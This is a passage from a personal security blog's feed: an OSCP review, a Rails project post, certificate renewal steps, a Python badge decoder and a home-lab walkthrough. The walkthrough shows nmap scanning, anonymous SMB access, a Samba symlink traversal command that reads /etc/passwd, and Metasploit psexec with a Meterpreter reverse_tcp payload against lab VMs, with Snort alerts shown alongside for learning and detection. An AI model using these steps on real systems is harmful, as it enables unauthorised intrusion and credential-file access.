&lt;li&gt;Review by &lt;a href=&#34;https://blog.g0tmi1k.com/2011/07/pentesting-with-backtrack-pwb/&#34;&gt;g0tmi1k&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Review by &lt;a href=&#34;http://fourfourfourfour.co/2014/04/20/oscp-review/&#34;&gt;recrudesce&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Review from &lt;a href=&#34;http://buffered.io/posts/oscp-and-me/&#34;&gt;Buffered.io&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Review from &lt;a href=&#34;http://www.iodigitalsec.com/offensive-security-pwb-course-and-oscp-certification-review/&#34;&gt;IODigitalSec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Review from &lt;a href=&#34;http://www.securitysift.com/offsec-pwb-oscp/&#34;&gt;SecuritySift&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br/&gt;
For a little preview of what&amp;rsquo;s involved, check out the free &lt;a href=&#34;http://www.offensive-security.com/metasploit-unleashed/Main_Page&#34;&gt;Metasploit Unleashed&lt;/a&gt; course.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Material, Course, and Exam&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After completing the 300+ page &lt;a href=&#34;http://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf&#34;&gt;pdf material&lt;/a&gt;, &lt;a href=&#34;http://www.offensive-security.com/about-us/&#34;&gt;muts&lt;/a&gt;-narrated videos and exercises, I
focused my attention on the lab. It is at this point, when the course turns from a more academic focus to an applied and practical nature, that the magnitude of what one is learning begins to sink in. A lab with nearly fifty diverse machines across multiple networks awaits with no further instructions. But with enumeration comes vulnerable machines, and each machine is different. Some are simple to exploit, some are difficult, some are incredibly frustrating. Every one is rewarding.&lt;/p&gt;

&lt;p&gt;Several months later, after getting root or system access on nearly every machine, and completing a final lab penetration test report of over two hundred pages, I felt ready for the 24 hour exam. Exam day had me giddy as a little kid and went smoothly. Ten hours in I had enough points to pass but I spent another eight hours attempting to privilege escalate my way to system on one remaining machine. I eventually succumbed to exhaustion knowing I had more than enough points to pass and wishing to be functional the next day to write up my exam report.&lt;/p&gt;

&lt;p&gt;Several days after submitting the exam report along with my final lab report, I received the much-anticipated email stating that I had passed the exam and now held my Offensive Security Certified Professional certification. I have mixed feelings about the value of certifications since just about anyone can take a test and pass. But this one - this one a person has to work for.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;A few take aways&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Document, document, document&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I used Keepnote on my host machine to track everything. It&amp;rsquo;s certainly not without its frustrations, but it does the job. Don&amp;rsquo;t forget to back everything up!&lt;/li&gt;
&lt;li&gt;Write up every machine after popping, including a summary and detailed steps along with key screenshots - you will thank yourself later. It&amp;rsquo;s easy to forget, and coming back a few weeks or months later while writing up your report because you forgot something and finding your documentation didn&amp;rsquo;t include some small issue is frustrating.
&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br/&gt;
Enumeration is key&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Every single machine is vulnerable and exploitable, it&amp;rsquo;s simply a matter of finding it.&lt;/li&gt;
&lt;li&gt;Reset boxes before attempting them, especially Windows. I spent many an unneeded hour working through possible exploits when a SMB service had simply
been crashed by a previous student and Metasploit would have gotten me in immediately.&lt;/li&gt;
&lt;li&gt;Privilege escalation provides lessons in patience. The following resources were invaluable.

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.greyhathacker.net/?p=738&#34;&gt;http://www.greyhathacker.net/?p=738&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.fuzzysecurity.com/tutorials/16.html&#34;&gt;http://www.fuzzysecurity.com/tutorials/16.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&#34;&gt;http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br/&gt;
Post exploitation is paramount&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Multiple boxes include passwords, scripts, and log files which will provide access or attack vectors to other machines.&lt;/li&gt;
&lt;li&gt;Missing one thing can lead to wasted time chasing down red herrings.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br/&gt;
Utilize the admins&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Make use of the admins on IRC at #offsec. While they won&amp;rsquo;t give you the answer, they often ask questions which get you thinking in a certain way, and simply explaining what steps you have taken can lead to other paths for success.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br/&gt;
Commit the time&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The material covered in this course is not terribly difficult, but it does take practice. And practice requires time. I spent at least fifteen hours every week in the labs over the course of a few months.&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br/&gt;
I think the only dissatisfaction I experienced was while working on a exploiting a machine while another student was attempting to do the same and continually reset the box wiping out any steps taken to obtain a shell for instance. This was rare, though.&lt;/p&gt;

&lt;p&gt;Overall, this was an awesome learning experience. If you&amp;rsquo;re thinking about doing it, and you have the time to dedicate, there is no question: just do it. If you actually want to learn and understand the material, rather than just memorize a bunch of information as is the case with so many other certifications, this is for you. It&amp;rsquo;s affordable, lab time is easily extended, admins are almost always available, and the cost is not prohibitive.&lt;/p&gt;

&lt;p&gt;Thanks Offensive Security and team for putting together such a fantastic course.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Building a Web App in Rails</title>
      <link>https://www.thesubtlety.com/post/building-a-web-app-in-rails/</link>
      <pubDate>Fri, 11 Apr 2014 01:57:03 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/building-a-web-app-in-rails/</guid>
      <description>&lt;p&gt;A brilliant &lt;a href=&#34;http://blaedj.github.io/&#34;&gt;software engineering friend&lt;/a&gt; and I were recently discussing with another mutual friend the inefficiencies of employees filling out paper forms after completion of a construction job and the inefficiencies of transferring said forms to excel and so on. Said friend and I figured we could probably fix this with a web app for a nominal fee, but which would greatly increase our mutual friends&amp;rsquo; productivity. A win win situation if there ever was one.&lt;/p&gt;

&lt;p&gt;So we set about the process of building a web application in Ruby on Rails. And several weeks later, we had one completed. It&amp;rsquo;s nothing too fancy, but one that is being used in production and is adding business value. And it was an awesome learning experience. I just wanted to highlight some of what we encountered, how we went about the task, and a few lessons learned along the way.&lt;/p&gt;

&lt;p&gt;Said friend and I had tinkered with Ruby on Rails before, but never to any great extent, nor had we worked with a business customer in this fashion by building a product to solve a problem, so I&amp;rsquo;m quite pleased with the way our stabbings in the dark went.&lt;/p&gt;

&lt;p&gt;We had gotten okay requirements with the first discussions, and putting our collective heads together to make a small pile of rocks, we discussed how long this would take, what tools, libraries, and third party applications to use, where we would be hosting, understanding how we would actually solve the problem, and what to charge. Mutual friend agreed, and off we went.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Working remotely&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We worked together remotely on this project. Skype and Google hangouts worked well when our schedules coincided. Starting out, we worked in tandem to get the foundation
down and a workflow established, and as we became more proficient, our productivity increased as we worked in parallel on different issues. Git, Github, and Heroku make for incredibly painless collaboration. I learned that git is a stupid content tracker, and a great tool. And for small deployments like this one, Heroku&amp;rsquo;s robustness and free-ness were awesome.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;On Building&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As we hadn&amp;rsquo;t used RoR too much beyond tutorials, we bootstrapped using &lt;a href=&#34;http://ruby.railstutorial.org/&#34;&gt;Michael Hartl&amp;rsquo;s tutorial&lt;/a&gt; to get us started. Unlike many online tutorials, this one has great explanations and security hygiene and explained in great detail the user authentication and authorization pieces (among many others). And gems like bcrypt&amp;rsquo;s has_secure_token for example, makes the implementation of secure passwords brain-dead simple. Rails make things very easy implement. Almost too easy. That opinion is likely due to not having worked too in depth with PHP, Apache, and MySQL. And now that I begin to recall the school projects of years past, RoR is quite nice indeed.&lt;/p&gt;

&lt;p&gt;Our requirements didn&amp;rsquo;t have us do anything too difficult, although we certainly had our share of hurdles; both in learning how the framework works and actually solving design problems. Working our way through various database relationships was a challenge, and pretty rewarding once we came up with solutions. Proper inheritance, indexing, and scoping all gave cause for some extra reading. Heroku makes things incredibly easy as far as using APIs, so incorporating email was no problem either.&lt;/p&gt;

&lt;p&gt;UI and UX is always interesting. I hate poorly thought out UIs with a passion, so building a sensible interface was important. Yet css, javascript, html, and various cross-platform and browser (in)compatibilities can easily drive one nuts. And since I have no desire to wander about in insanity, we ended up using Bootstrap and HTML5 to keep things simple. And simple is beautiful.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;On Changing requirements&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;And just like any other project, we had multiple feature requests as the weeks went by. All honored because we are kind and generous souls. These things had impacts on our initial estimates, but understandably so from our wonderful customer&amp;rsquo;s perspective.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;A Few Lessons Learned&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Requirements are very important. More time spent at the beginning better understanding how users interact with and use an application is essential.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Understanding the various differences between mobile and desktop and between various browser rendering is pretty important. For example, we initially used Chrome for testing purposes with things working great. When we got reports back saying dates don&amp;rsquo;t work we were initially baffled. Apparently Firefox doesn&amp;rsquo;t render the date drop down and requires a very specific format.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Helpful error messages and graceful error handling is paramount to ease user experience.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Logging and alerting is essential. Multiple times we have been immediately alerted when things break or user experience is poor, allowing us to investigate and resolve.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Tests are essential. Refactoring a feature should never break existing functionality.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;On Securing&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Fortunately Rails 4 comes with many secure defaults such as protect_from_forgery for example, which adds csrf tokens to forms automatically. There are many great resources out there to help secure web apps. &lt;a href=&#34;http://brakemanscanner.org/&#34;&gt;Brakeman&lt;/a&gt; and &lt;a href=&#34;https://github.com/codesake/codesake-dawn&#34;&gt;Dawn by Codesake&lt;/a&gt; both caught a number of issues that were remediated. And while &lt;a href=&#34;https://www.owasp.org/images/8/89/Rails_Security_2.pdf&#34;&gt;this&lt;/a&gt; resource is aging, and many of the issues outlined in it are remediated in later versions of Ruby, it is a great guide explaining what to look for, why various practices are poor, their consequences, and how to remediate them.&lt;/p&gt;

&lt;p&gt;No mention of app sec should be without reference to OWASP. The &lt;a href=&#34;https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project&#34;&gt;OWASP Top Ten&lt;/a&gt; and &lt;a href=&#34;https://www.owasp.org/index.php/Secure_SDLC_Cheat_Sheet&#34;&gt;Secure SDLC&lt;/a&gt; have a plethora of good resources for Builders, Breakers, and Defenders. While this project was fairly ad-hoc, there are enough resources on OWASP for another post and give rise to more than a few questions and places for improvement going forward. The &lt;a href=&#34;https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet&#34;&gt;OWASP RoR Cheatsheet&lt;/a&gt; is a good resource as well. And another: The &lt;a href=&#34;http://guides.rubyonrails.org/security.html&#34;&gt;RoR Security Guide&lt;/a&gt;. There is no end to good resources out there.&lt;/p&gt;

&lt;p&gt;Yet another well written and mildly humourous post by Honeybadger is &lt;a href=&#34;http://www.honeybadger.io/blog/guides/2013/03/09/ruby-security-tutorial-and-rails-security-guide&#34;&gt;here&lt;/a&gt; which contains wise advice such as the following.
&lt;code&gt;match &amp;quot;/launch_all_the_missiles&amp;quot;, to: &amp;quot;missiles#launch_all&amp;quot;
Conclusion: PANIC!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And Kalzumeus&amp;rsquo;s awesome blog and excellent &lt;a href=&#34;http://www.kalzumeus.com/2013/01/31/what-the-rails-security-issue-means-for-your-startup/&#34;&gt;post&lt;/a&gt; on Rails security and startups has a ton of all around great advice.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;In Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;While this post is fairly short, I learned an incredible amount from completing this project. From both the technical aspects of working with Ruby on Rails, git, various APIs, and Heroku to the business and customer aspects, this was challenging, fun, and rewarding. And getting to delve into the web app sec world in more detail and have a postive impact on a business application is a reward in its own. Of course maintaining a production web application means the work is never done, so there is that as well. A little lesson all in it&amp;rsquo;s own, I suppose.&lt;/p&gt;

&lt;p&gt;Thanks for reading.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Renewing your StartCom SSL Cert</title>
      <link>https://www.thesubtlety.com/post/renewing-your-startcom-ssl-cert/</link>
      <pubDate>Sat, 15 Mar 2014 00:57:49 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/renewing-your-startcom-ssl-cert/</guid>
      <description>&lt;p&gt;Since I&amp;rsquo;ve forgotten how to do this over the past year, here are the directions for posterity.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Startcom sends you a reminder after 50 weeks and opens a window for a renewal. Log in and validate your email and domain using the Validation Wizard. Note, you need to ensure your email is going to forward properly.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Generate a key and CSR on the server with the following two commands
&lt;code&gt;openssl genrsa -out ./www.thesubtlety.com.key 2048&lt;/code&gt; 
&lt;code&gt;openssl req -new -key www.thesubtlety.com.key -out www.thesubtlety.com.csr&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Once your domain is validated by StartSSL, you need to request a new certificate which is pretty self explanatory. Use the Certificate Wizard, follow the prompts, and paste in the CSR where asked.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Once you&amp;rsquo;ve got that, copy it to a .crt file on the server.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Don&amp;rsquo;t forget the chain file. This can be created by cat-ing the files ca.pem and sub.class1.server.ca.pem &lt;a href=&#34;https://www.startssl.com/certs/&#34;&gt;here&lt;/a&gt; into a .chn file.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The NFS SSL help and request link is here: &lt;a href=&#34;https://members.nearlyfreespeech.net/username/support/assist?tag=ssl&#34;&gt;https://members.nearlyfreespeech.net/username/support/assist?tag=ssl&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And finally, verify the newly installed cert is updated with a new expiration date.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Just the Basics</title>
      <link>https://www.thesubtlety.com/post/just-the-basics/</link>
      <pubDate>Mon, 17 Feb 2014 20:58:31 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/just-the-basics/</guid>
      <description>&lt;p&gt;Things have been busy lately, but I&amp;rsquo;ve been doing some reading, learning, and playing around in a small VM lab, and thought to briefly document what I&amp;rsquo;ve done. There is unfortunately nothing groundbreaking here, and nothing too interesting beyond a demonstration.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;___  ___       _                      _         _  _   
|  \/  |      | |                    | |       (_)| |  
| .  . |  ___ | |_  __ _  ___  _ __  | |  ___   _ | |_ 
| |\/| | / _ \| __|/ _` |/ __|| &#39;_ \ | | / _ \ | || __|
| |  | ||  __/| |_| (_| |\__ \| |_) || || (_) || || |_ 
\_|  |_/ \___| \__|\__,_||___/| .__/ |_| \___/ |_| \__|
                              | |                      
                              |_|
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For this example I&amp;rsquo;ve got Kali Linux, Metasploitable, Windows XP SP2, and Security Onion running. (Time to add some RAM&amp;hellip;) There are a ton of good reference resources out there, and most of this is simply plug and play. The Kali distro isn&amp;rsquo;t packaged with &lt;a href=&#34;http://www.tenable.com/products/nessus/select-your-operating-system&#34;&gt;Nessus&lt;/a&gt;, so that may need downloaded and installed, although certainly not required for our purposes. Nothing fancy here as all machines are on the same subnet and bridged via my host NIC, making traffic sniffing trivial and allowing us to see the (mostly Snort rule) results of this nefarious-ness.&lt;/p&gt;

&lt;p&gt;The Metasploit Unleashed &lt;a href=&#34;http://www.offensive-security.com/metasploit-unleashed/&#34;&gt;guide&lt;/a&gt; makes for a handy reference tool for Metasploit and Meterpreter themselves as well as a jumping off point into further research; namely fuzzing, exploit design, and post-exploitation topics. Another handy reference was the second half of this Security Onion &lt;a href=&#34;https://code.google.com/p/security-onion/wiki/IntroductionWalkthrough&#34;&gt;walkthrough&lt;/a&gt;; the example with Sguil that was walked through was both interesting and instructive.&lt;/p&gt;

&lt;p&gt;With all of the VMs up and running, msfconsole started in Kali, and with Security Onion listening to our traffic, let&amp;rsquo;s do a little host discover with nmap. Metasploit provides an easy way to automatically populate results into its database with the db_nmap command.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;db_nmap -Pn -sS -A 192.168.100.1/24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The results are automatically stored and are easily seen with via &amp;lsquo;hosts&amp;rsquo; and &amp;lsquo;services&amp;rsquo;. Exporting normal nmap results to an xml file can allow for easily importing into msf as well.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf&amp;gt; hosts
Hosts
======
address         mac               name            os_name os_flavor os_sp purpose
-------         ---               ----            ------- --------- ----- -------
192.168.100.192 de:ad:be:ef:ca:fe 192.168.100.192 Linux   Debian          server

msf&amp;gt; services 192.168.100.192
Services
========
host              port  proto  name   state    info
----              ----  -----  ----   -----    ----      
192.168.100.192   21    tcp    ftp    open     ProFTPD 1.3.1
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nmap can be a fairly noisy tool as far as traffic generated though, as Sguil/Snorby results show. Snort alerts on fifty or so &amp;lsquo;potential scans&amp;rsquo; and the Nmap scripting engine has very recognizable traffic. If we run nmap without the -A agressive option, we reduce the amount of alerts considerably (from nearly 50 to about 7 or so events generated without the nmap scripts). &lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://www.thesubtlety.com/img/nmap_snorby.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Tip toeing around Snort rules and timers is an interesting game. Fyodor&amp;rsquo;s Nmap &lt;a href=&#34;http://nmap.org/book/&#34;&gt;book&lt;/a&gt; has quite a bit of information around this and makes for interesting reading. Another thing to note is the default User Agent for Nmap scripts is fairly conspicuous as seen below. According to &lt;a href=&#34;http://www.kroosec.com/2012/02/making-nmap-scripting-engine-stealthier.html&#34;&gt;this guy&lt;/a&gt;, that can be easily changed in the nse lua settings.&lt;/p&gt;

&lt;p&gt;Another option for host and vulnerability discovery is via &lt;a href=&#34;https://en.wikipedia.org/wiki/Nessus_(software)&#34;&gt;Nessus&lt;/a&gt;. Nmap and it&amp;rsquo;s version detection can get us a long way, but Nessus will give us a laundry list of poor configurations, out of date services, relevant CVEs, and fixes. The new HTML5 UI is quite nice to use; simply run a scan on your desired targets and export as as a nessus file (xml format) for Metasploit to import.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Anyways&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf&amp;gt; services 192.168.100.192
Services
========
host              port  proto  name        state    info
----              ----  -----  ----        -----    ----      
192.168.100.192   21    tcp    ftp         open     ProFTPD 1.3.1
192.168.100.192   137   udp    nebios-ns   open     
192.168.100.192   139   tcp    netbios-ssn open     Samba smbd 3.x workgroup
192.168.100.192   445   tcp    netbios-ssn open     Samba sbbd 3.x workgroup
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like Samba is running on Metasploitable. &lt;a href=&#34;https://www.grc.com/port_137.htm&#34;&gt;This&lt;/a&gt; page has some background info along with links to RFCs and other relevant netbios info.&lt;/p&gt;

&lt;p&gt;In another terminal on Kali let&amp;rsquo;s see what shares are available with &amp;lsquo;smbclient -L //192.168.100.192&amp;rsquo;. Note this generates two low severity &amp;lsquo;GPL NETBIOS SMB unicode share access&amp;rsquo; Snort events. /tmp is available, with a cute &amp;lsquo;oh noes!&amp;rsquo; comment. Hmm, let&amp;rsquo;s try there first.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# smbclient -L //192.168.100.192
Enter roots&#39;s password: &amp;lt;blank&amp;gt;
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
       Sharename         Type       Comment
       ---------         ----       -------
       opt               Disk       oh noes!
...

root@kali:~# smbclient //192.168.100.192/tmp
Enter roots&#39;s password: &amp;lt;blank&amp;gt;
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
smb: \&amp;gt; ls
  .
  ..
  .ICE-unix
  .X11-unix
  4608.jsvc_up
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we access this  share, we only see the /tmp directory and nothing more. But if the samba configuration allows &amp;lsquo;wide links&amp;rsquo; (which allow symbolic links to be added to a share) and allows write access to a directory, this is &amp;lsquo;exploitable&amp;rsquo; by linking the file system to a directory in /tmp. A decent explanation how this works is on &lt;a href=&#34;https://www.samba.org/samba/news/symlink_attack.html&#34;&gt;Samba.org&lt;/a&gt; and the &lt;a href=&#34;http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072944.html&#34;&gt;mailing list.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Manually, you simply connect via &lt;code&gt;smbclient //192.168.100.192/tmp&#39; anonymously, and enter &#39;symlink ../../../../../../../../../ rootfs&lt;/code&gt; which traverses back to root and links that to your newly created directory. This gives read access to /etc/passwd remotely. Fortunately, permissions are somewhat limited as the user is anonymous. Otherwise, Metasploit can take care of this for us with the Samba Link Traversal &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/samba_symlink_traversal.rb&#34;&gt;module&lt;/a&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://www.thesubtlety.com/img/Selection_002.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Once that has completed, open up a terminal, run &lt;code&gt;smbclient -L //192.168.100.192&lt;/code&gt;, enter &amp;lsquo;cd rootfs2`, and \etc\passwd is ours. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Other Stuff&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Even more fun can be had with the psexec module and a set of credentials. More info on &lt;a href=&#34;http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx&#34;&gt;psexec&lt;/a&gt; and some more good information via &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified&#34;&gt;Rapid7&lt;/a&gt; for further reading.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf &amp;gt; use exploit/windows/smb/psexec
...
msf &amp;gt; set payload windows/meterpreter/reverse_tcp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Snort catches this with the high severity events&lt;strong&gt; &amp;rsquo;&lt;/strong&gt;ET SHELLCODE Possible call with a No Offset TCP Shellcode event&amp;rsquo; and an &amp;lsquo;ET POLICY PE EXE or DLL Windows file download&amp;rsquo;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://www.thesubtlety.com/img/Selection_003.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This isn&amp;rsquo;t an exploit so to speak, but is an easy way to play around with Meterpreter. &lt;a href=&#34;http://www.offensive-security.com/metasploit-unleashed/About_Meterpreter&#34;&gt;Meterpreter&lt;/a&gt; exists only in memory, but does require a DLL sent to the victim, which as we saw, Snort detected. Meterpreter is an impressive tool; an in depth guide exists &lt;a href=&#34;http://dev.metasploit.com/documents/meterpreter.pdf&#34;&gt;here&lt;/a&gt; (pdf).&lt;/p&gt;

&lt;p&gt;Next time I&amp;rsquo;ll try to post something a little more novel that what you&amp;rsquo;ve (maybe) just read. This all feels somewhat script-kiddyish without a solid understanding of exploit development, but a person&amp;rsquo;s got to start somewhere. There is virtually an unfathomable amount of knowledge and things to learn out there. Metasploitable in itself has a ton more to play with, not to mention Multillidae, DVWA, WebGoat, and others. I&amp;rsquo;d best get cracking.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>BSidesDC Badge </title>
      <link>https://www.thesubtlety.com/post/bsidesdc-badge/</link>
      <pubDate>Tue, 29 Oct 2013 01:19:19 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/bsidesdc-badge/</guid>
      <description>&lt;p&gt;I recently attended my first security conference: BSidesDC. This isn&amp;rsquo;t a write up of that experience, although it was quite interesting and I learned a lot via some great sessions. One talk I really enjoyed by &lt;a href=&#34;https://twitter.com/grecs&#34;&gt;@grecs&lt;/a&gt; was &lt;a href=&#34;https://www.novainfosec.com/2013/10/19/malware-analysis-slides-from-bsidesdc/&#34;&gt;Malware Analysis 101&lt;/a&gt;. Very well presented with lots of great getting started material.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://www.thesubtlety.com/img/bsides-150x150.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Anyways, the badges. Pretty cool badges; bottle openers in fact, with fourteen binary bytes all with leading zeroes around the circumference: ascii encoded &lt;a href=&#34;https://en.wikipedia.org/wiki/Binary_code&#34;&gt;binary&lt;/a&gt;. The message is trivially found via google, but where&amp;rsquo;s the fun in that? And wanting to play around with Python some more I decided to write something that could decode the binary. My first stab looks like this.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python
# This was a quick and dirty excercise in Python without googling the answer. 
# No error checking, etc... Check out the Python unicode page and the BitManipulation
# page for more info and probably the proper way to do this. 

import argparse

def main():

    #argparse is overkill for this, but was fun to play around with
    parser = argparse.ArgumentParser(description=&amp;quot;Convert between ascii and binary &amp;quot;
                                                  and vice verse.&amp;quot;)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(&#39;--to_binary&#39;, action=&amp;quot;store&amp;quot;, dest=&amp;quot;ascii&amp;quot;, nargs=&amp;quot;+&amp;quot;)
    group.add_argument(&#39;--to_ascii&#39;, action=&amp;quot;store&amp;quot;, dest=&amp;quot;bin&amp;quot;, nargs=&amp;quot;+&amp;quot;)
    args = parser.parse_args()

    #Sends user input to the appropriate function
    if args.ascii is not None:
        to_binary(args.ascii)
    elif args.bin is not None:
        to_ascii(args.bin)

def to_binary(args):
    chars_bin = [bin(ord(each)) for each in [item for sublist in args for item in \
                sublist]] 
    print &amp;quot; &amp;quot;.join([each[2:].zfill(8) for each in chars_bin])
    ### The Stack Overflow way
    ### print &#39;&#39;.join(&#39;{:08b}&#39;.format(ord(each)) for each in args) 

def to_ascii(args):
    print &amp;quot;&amp;quot;.join([(chr(int(str(each),2))) for each in args])
    ### The Stack Overflow way
    ### print &amp;quot;&amp;quot;.join(chr(args[i:i+8],2)) for i in xrange(0, len(args), 8)) 

if __name__ == &amp;quot;__main__&amp;quot;: main()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And running this with our badge&amp;rsquo;s binary:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;python binary_ascii.py --to_ascii 01101001 01101110 01100010 01100101 01100101 \
01110010 01110111 01100101 01110100 01101000 01101001 01110010 01110011 01110100 
inbeerwethirst

python binary_ascii.py --to_ascii 01100010 01110011 01101001 01100100 01100101 \
01110011 01110011 01100101 01100011 01110101 01110010 01101001 01110100 01111001 
bsidessecurity
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Much cleverness by the organizers. One side says &amp;ldquo;BSides Security&amp;rdquo; and the other &amp;ldquo;In Beer We Thirst&amp;rdquo;&amp;hellip;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Security Onion Network Configuration and Install</title>
      <link>https://www.thesubtlety.com/post/security-onion-network-configuration-and-install/</link>
      <pubDate>Sat, 19 Oct 2013 02:41:57 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/security-onion-network-configuration-and-install/</guid>
      <description>
&lt;figure &gt;
    
        &lt;img src=&#34;https://www.thesubtlety.com/img/theonion-wait-what-150x150.jpeg&#34; alt=&#34;With apologies to The Onion&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;p&gt;
        With apologies to The Onion
        
            
        
        &lt;/p&gt; 
    &lt;/figcaption&gt;
    
&lt;/figure&gt;


&lt;p&gt;I&amp;rsquo;ve played around with &lt;a href=&#34;http://securityonion.blogspot.com/&#34;&gt;Security Onion&lt;/a&gt; in the past, but have never set up my network to capture or monitor traffic. And while installing Security Onion in a VM and only looking at only local or inter-VM traffic is quite interesting, especially if a person is playing around with Metasploit or something, I wanted to see all network traffic, including my other devices. I also had a laptop lying around, not being frequently used; perfect for dedicated monitoring. So I finally got around to working through the details and going through the setup and configuration. This is a little essay on how I did that.&lt;/p&gt;

